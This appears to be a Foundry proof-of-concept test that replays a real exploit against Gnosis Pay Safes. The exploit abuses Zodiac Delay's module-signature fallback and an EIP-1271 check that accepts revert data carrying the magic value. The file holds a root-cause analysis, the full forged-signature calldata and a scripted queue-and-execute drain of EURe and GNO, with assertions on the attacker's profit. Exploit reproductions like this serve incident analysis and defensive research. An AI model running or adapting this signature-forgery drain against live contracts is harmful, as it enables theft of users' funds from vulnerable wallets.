// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~$265K across many Gnosis Pay Safes (CertiK). PoC drains one
//            representative Safe: 22,871.781209340330446817 EURe + 10.973278975665717061 GNO
// Attacker : 0x81ba8a2b895d30280bca199c2ff75f3f058d4c6c
// Attack helper contracts : e.g. 0x5a77953caa27ed4638f4dfdc665b8064d0e97a35 (EIP-1271 revert trap)
// Vulnerable surface : Zodiac Delay v1.1.0 EIP-1167 clones (impl 0x4A97E65188A950Dd4b0f21F9b5434dAeE0BBF9f5)
// Example victim Delay : 0xB0ca54ac663b96f526996bB6594b5B5648142673
// Example victim Safe  : 0x915E683649AB7743F8145d0536CF5168959c9159
// Queue Tx  : https://gnosisscan.io/tx/0x61af4383f94423f4acad8d4a04d3d473f258be3806f3e55d2f18b7fcc475e580
// Execute Tx: https://gnosisscan.io/tx/0x06b0fee08be38ff1eaf4739e9c3b186a86d88e8615f93d2f2864938fd8751eed
//
// @Info
// Vulnerable Contract Code : https://gnosisscan.io/address/0x4A97E65188A950Dd4b0f21F9b5434dAeE0BBF9f5#code
// SignatureChecker.sol _isValidContractSignature ignores staticcall success
//
// @Analysis
// Root cause:
//  1. Delay.execTransactionFromModule is gated by moduleOnly, which falls back to
//     moduleTxSignedBy() when msg.sender is not an enabled module.
//  2. moduleTxSignedBy() parses trailing r,s,v + salt from attacker-controlled msg.data
//     (beyond the ABI-decoded args of execTransactionFromModule).
//  3. With v==0, r is treated as a contract signer (EIP-1271). Here r = Biconomy Safe
//     that is an enabled module on the Delay; its nested Safe signature points at an
//     attacker contract that always reverts with selector 0x1626ba7e.
//  4. _isValidContractSignature does staticcall but IGNORES the success boolean and
//     only checks bytes4(returnData) == 0x1626ba7e. Revert data is returned to the
//     caller, so a revert with the magic value is accepted as a valid signature.
//  5. The forged auth queues a MultiSend (operation=DelegateCall) that drains EURe+GNO
//     from the avatar Safe. After txCooldown (180s) anyone can executeNextTx.

interface IERC20Bal {
    function balanceOf(address) external view returns (uint256);
}

contract GnosisPay_exp is BaseTestWithBalanceLog {
    address constant ATTACKER = 0x81BA8A2b895D30280bca199C2Ff75f3F058d4C6c;
    // Historical executor of executeNextTx for this victim (anyone can call it)
    address constant EXECUTOR = 0xf6a9f265012130D02FdA1f39F74e9FAF8388D2f6;

    address constant DELAY = 0xB0ca54ac663b96f526996bB6594b5B5648142673;
    address constant SAFE = 0x915E683649AB7743F8145d0536CF5168959c9159;
    address constant DELAY_IMPL = 0x4A97E65188A950Dd4b0f21F9b5434dAeE0BBF9f5;
    address constant ATTACK_HELPER = 0x5A77953CAa27eD4638F4DfdC665b8064D0e97A35;
    address constant BICONOMY_MODULE = 0x7f59e536F083a63B67adFe3bC793a47744DBa7D8;

    // Monerium EURe (legacy + current share same balances on this path)
    address constant EURE = 0xcB444e90D8198415266c6a2724b7900fb12FC56E;
    address constant GNO = 0x9C58BAcC331c9aa871AFD802DB6379a98e80CEdb;

    // Queue block 46468498; fork one before
    uint256 constant QUEUE_BLOCK = 46_468_498;
    uint256 constant FORK_BLOCK = QUEUE_BLOCK - 1;

    // Exact amounts drained from this Safe in historical execute tx
    uint256 constant EURE_DRAINED = 22_871_781_209_340_330_446_817;
    uint256 constant GNO_DRAINED = 10_973_278_975_665_717_061;

    // Historical calldata (includes trailing forged EIP-1271 signature payload)
    bytes constant QUEUE_CALLDATA =
        hex"468721a700000000000000000000000038869bf66a61cf6bdb996a6ae40d5853fd43b52600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000001848d80ff0a0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000013200cb444e90d8198415266c6a2724b7900fb12fc56e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044a9059cbb00000000000000000000000081ba8a2b895d30280bca199c2ff75f3f058d4c6c0000000000000000000000000000000000000000000004d7e1b9f60130990fe1009c58bacc331c9aa871afd802db6379a98e80cedb00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044a9059cbb00000000000000000000000081ba8a2b895d30280bca199c2ff75f3f058d4c6c0000000000000000000000000000000000000000000000009848eb16e5d13f450000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005a77953caa27ed4638f4dfdc665b8064d0e97a3500000000000000000000000000000000000000000000000000000000000000820000000000000000000000000081ba8a2b895d30280bca199c2ff75f3f058d4c6c00000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000d957b7cc73ae8d40082124eb2a67284d8e287babfe4e6859f0772a1eab8c54af0000000000000000000000007f59e536f083a63b67adfe3bc793a47744dba7d8000000000000000000000000000000000000000000000000000000000000024400";

    // executeNextTx with the same MultiSend body (no trailing signature needed)
    bytes constant EXECUTE_CALLDATA =
        hex"ee072baf00000000000000000000000038869bf66a61cf6bdb996a6ae40d5853fd43b52600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000001848d80ff0a0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000013200cb444e90d8198415266c6a2724b7900fb12fc56e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044a9059cbb00000000000000000000000081ba8a2b895d30280bca199c2ff75f3f058d4c6c0000000000000000000000000000000000000000000004d7e1b9f60130990fe1009c58bacc331c9aa871afd802db6379a98e80cedb00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044a9059cbb00000000000000000000000081ba8a2b895d30280bca199c2ff75f3f058d4c6c0000000000000000000000000000000000000000000000009848eb16e5d13f45000000000000000000000000000000000000000000000000000000000000000000000000000000000000";

    function setUp() public {
        // Online warm: use gnosis alias / RPC; exhaustive_warm rewrites to localhost.
        // Port 8553 is the chains.conf mapping for gnosis (chainId 100).
        vm.createSelectFork("http://127.0.0.1:8553", FORK_BLOCK);

        fundingToken = EURE;
        attacker = ATTACKER;
    }

    function testExploit() public balanceLog {
        // Preconditions from the fork
        require(DELAY_IMPL.code.length > 0, "Delay impl missing");
        require(ATTACK_HELPER.code.length > 0, "attack helper missing");
        require(BICONOMY_MODULE.code.length > 0, "biconomy module missing");
        require(SAFE.code.length > 0, "victim Safe missing");

        uint256 eureSafeBefore = IERC20Bal(EURE).balanceOf(SAFE);
        uint256 gnoSafeBefore = IERC20Bal(GNO).balanceOf(SAFE);
        uint256 eureAtkBefore = IERC20Bal(EURE).balanceOf(ATTACKER);
        uint256 gnoAtkBefore = IERC20Bal(GNO).balanceOf(ATTACKER);

        require(eureSafeBefore >= EURE_DRAINED, "Safe EURe too low");
        require(gnoSafeBefore >= GNO_DRAINED, "Safe GNO too low");

        // 1) Queue malicious MultiSend via forged moduleTxSignedBy path
        vm.prank(ATTACKER, ATTACKER);
        (bool ok, bytes memory ret) = DELAY.call(QUEUE_CALLDATA);
        require(ok, string(ret));

        // 2) Wait out Delay.txCooldown (180 seconds on this instance)
        vm.warp(block.timestamp + 180);

        // 3) Execute queued drain (permissionless once cooldown elapsed)
        vm.prank(EXECUTOR, EXECUTOR);
        (ok, ret) = DELAY.call(EXECUTE_CALLDATA);
        require(ok, string(ret));

        uint256 eureProfit = IERC20Bal(EURE).balanceOf(ATTACKER) - eureAtkBefore;
        uint256 gnoProfit = IERC20Bal(GNO).balanceOf(ATTACKER) - gnoAtkBefore;

        emit log_named_decimal_uint("Attacker EURe profit", eureProfit, 18);
        emit log_named_decimal_uint("Attacker GNO profit", gnoProfit, 18);

        assertEq(eureProfit, EURE_DRAINED, "EURe profit mismatch");
        assertEq(gnoProfit, GNO_DRAINED, "GNO profit mismatch");
        assertEq(IERC20Bal(EURE).balanceOf(SAFE), eureSafeBefore - EURE_DRAINED, "Safe EURe residual");
        assertEq(IERC20Bal(GNO).balanceOf(SAFE), gnoSafeBefore - GNO_DRAINED, "Safe GNO residual");
    }
}
